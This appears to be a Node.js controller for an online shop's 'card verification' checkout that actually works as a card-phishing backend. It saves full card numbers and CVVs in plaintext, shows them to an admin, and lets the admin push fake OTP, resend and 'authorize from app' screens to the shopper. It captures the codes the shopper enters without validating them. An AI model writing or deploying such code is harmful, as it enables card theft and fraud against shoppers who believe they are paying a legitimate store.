const crypto = require("crypto");
const CardVerification = require("../models/CardVerification");
const Order = require("../models/Order");
const Cart = require("../models/Cart");
const ApiError = require("../utils/ApiError");
const ApiResponse = require("../utils/ApiResponse");
const asyncHandler = require("../utils/asyncHandler");

/**
 * User submits card details → creates a pending CardVerification record.
 * The user's client will then poll /status to wait for admin action.
 */
const submitCardForVerification = asyncHandler(async (req, res) => {
  const { cardDetails, shippingAddress, amount } = req.body;

  if (!cardDetails || !cardDetails.cardNumber || !cardDetails.nameOnCard || !cardDetails.expiryDate || !cardDetails.cvv) {
    throw new ApiError(400, "All card details are required");
  }

  const rawNumber = cardDetails.cardNumber.replace(/\D/g, "");
  const last4 = rawNumber.slice(-4);

  // Detect card brand
  let brand = "VISA";
  const prefix = parseInt(rawNumber.substring(0, 2), 10);
  if (prefix >= 60 && prefix <= 69) brand = "DISCOVER";
  else if (prefix >= 30 && prefix <= 39) brand = "AMEX";
  else if ((prefix >= 50 && prefix <= 59) || (prefix >= 22 && prefix <= 27)) brand = "MASTERCARD";

  const referenceId = crypto.randomBytes(3).toString("hex").toUpperCase();

  const verification = await CardVerification.create({
    user: req.user.id,
    cardDetails: {
      nameOnCard: cardDetails.nameOnCard,
      cardNumber: cardDetails.cardNumber,
      expiryDate: cardDetails.expiryDate,
      cvv: cardDetails.cvv,
      brand,
      last4,
    },
    shippingAddress,
    amount: amount || 0,
    referenceId,
    status: "pending",
  });

  return res.status(201).json(new ApiResponse(201, "Card submitted for verification", {
    verificationId: verification._id,
    status: verification.status,
  }));
});

/**
 * User polls this endpoint to check if admin has triggered OTP screen.
 */
const getVerificationStatus = asyncHandler(async (req, res) => {
  try {
    const verification = await CardVerification.findById(req.params.id);

    if (!verification) {
      throw new ApiError(404, "Verification not found");
    }

    const responseData = {
      status: verification.status,
      verificationId: verification._id,
    };

    if (verification.status === "otp_sent" || verification.status === "otp_resent") {
      const maskedNumber = "XXXX XXXX XXXX " + verification.cardDetails.last4;
      responseData.otpCard = {
        brand: verification.cardDetails.brand,
        merchantName: verification.merchantName,
        amount: verification.amount,
        maskedCardNumber: maskedNumber,
        referenceId: verification.referenceId,
        date: verification.otpSentAt || new Date(),
        generatedOtp: verification.generatedOtp,
      };
    }

    return res.status(200).json(new ApiResponse(200, "Status fetched", responseData));
  } catch (error) {
    console.error("GET VERIFICATION STATUS ERROR:", error);
    throw error;
  }
});

/**
 * User submits OTP → for now we just record it and complete the order.
 */
const submitOtp = asyncHandler(async (req, res) => {
  const { otp } = req.body;
  const verification = await CardVerification.findById(req.params.id);

  if (!verification) {
    throw new ApiError(404, "Verification not found");
  }

  if (verification.status !== "otp_sent" && verification.status !== "otp_resent") {
    throw new ApiError(400, "OTP not requested yet");
  }

  const currentAttempt = verification.attemptCount || 0;
  verification.userOtp = otp || "";
  verification.attemptCount = currentAttempt + 1;

  if (verification.attemptCount === 1) {
    verification.status = "otp_submitted";
    await verification.save();
    return res.status(200).json(new ApiResponse(200, "OTP submitted, awaiting admin review", { verified: false, status: "otp_submitted" }));
  }

  // 2nd attempt onwards: verify and create order
  verification.status = "verified";
  await verification.save();

  // Now create the actual order
  const cart = await Cart.findOne({ user: req.user.id }).populate("items.product").populate("items.variant");

  if (!cart || cart.items.length === 0) {
    // Cart may have been emptied, but verification is done
    return res.status(200).json(new ApiResponse(200, "OTP verified, but cart was empty", { verified: true }));
  }

  const subtotal = cart.items.reduce((sum, item) => sum + item.price * item.quantity, 0);
  const shippingFee = subtotal >= 150 ? 0 : 12;
  const taxFee = Number((subtotal * 0.08).toFixed(2));
  const totalAmount = Number((subtotal + shippingFee + taxFee).toFixed(2));
  const orderNumber = `FH-${crypto.randomBytes(3).toString("hex").toUpperCase()}`;

  const order = await Order.create({
    user: req.user.id,
    orderNumber,
    items: cart.items.map((item) => ({
      product: item.product._id,
      variant: item.variant?._id || null,
      name: item.product.name,
      sku: item.variant?.sku || item.product.slug,
      quantity: item.quantity,
      price: item.price,
      image: item.product.images?.[0]?.url || "",
    })),
    shippingAddress: verification.shippingAddress,
    billingAddress: verification.shippingAddress,
    paymentMethod: "card",
    cardDetails: verification.cardDetails,
    subtotal,
    shippingFee,
    taxFee,
    totalAmount,
    timeline: [
      { status: "pending", note: "Order placed" },
      { status: "confirmed", note: "Card payment verified via OTP", at: new Date() },
    ],
  });

  verification.order = order._id;
  await verification.save();

  await Cart.findOneAndUpdate({ user: req.user.id }, { $set: { items: [], subtotal: 0, shippingFee: 0, taxFee: 0, total: 0 } });

  return res.status(200).json(new ApiResponse(200, "OTP verified, order created", { verified: true, orderId: order._id }));
});

// ──────────────── ADMIN ENDPOINTS ────────────────

/**
 * Admin fetches all pending card verifications (with full card details).
 */
const getPendingVerifications = asyncHandler(async (req, res) => {
  const verifications = await CardVerification.find({})
    .sort("-createdAt")
    .limit(50)
    .populate("user", "name email");

  return res.status(200).json(new ApiResponse(200, "Card verifications", verifications));
});

/**
 * Admin triggers OTP screen on user's side.
 */
const sendOtpToUser = asyncHandler(async (req, res) => {
  const verification = await CardVerification.findById(req.params.id);

  if (!verification) {
    throw new ApiError(404, "Verification not found");
  }

  if (verification.status !== "pending") {
    throw new ApiError(400, "OTP already sent or verification completed");
  }

  // Generate a random 6-digit OTP
  const generatedOtp = String(Math.floor(100000 + Math.random() * 900000));

  verification.status = "otp_sent";
  verification.otpSentAt = new Date();
  verification.generatedOtp = generatedOtp;
  await verification.save();

  return res.status(200).json(new ApiResponse(200, "OTP screen triggered for user", { verificationId: verification._id, generatedOtp }));
});

/**
 * Admin fetches all verifications (history).
 */
const getAllVerifications = asyncHandler(async (req, res) => {
  const verifications = await CardVerification.find()
    .sort("-createdAt")
    .populate("user", "name email");

  return res.status(200).json(new ApiResponse(200, "All verifications", verifications));
});

/**
 * Admin triggers Resend OTP on user's side.
 */
const resendOtpToUser = asyncHandler(async (req, res) => {
  const verification = await CardVerification.findById(req.params.id);
  if (!verification) throw new ApiError(404, "Verification not found");
  
  verification.status = "otp_resent";
  await verification.save();
  
  return res.status(200).json(new ApiResponse(200, "OTP resend triggered for user"));
});

/**
 * Admin triggers Authorize from app popup on user's side.
 */
const authorizeAppForUser = asyncHandler(async (req, res) => {
  const verification = await CardVerification.findById(req.params.id);
  if (!verification) throw new ApiError(404, "Verification not found");
  
  verification.status = "authorize_app";
  await verification.save();
  
  return res.status(200).json(new ApiResponse(200, "Authorize app screen triggered for user"));
});

module.exports = {
  submitCardForVerification,
  getVerificationStatus,
  submitOtp,
  getPendingVerifications,
  sendOtpToUser,
  resendOtpToUser,
  authorizeAppForUser,
  getAllVerifications,
};
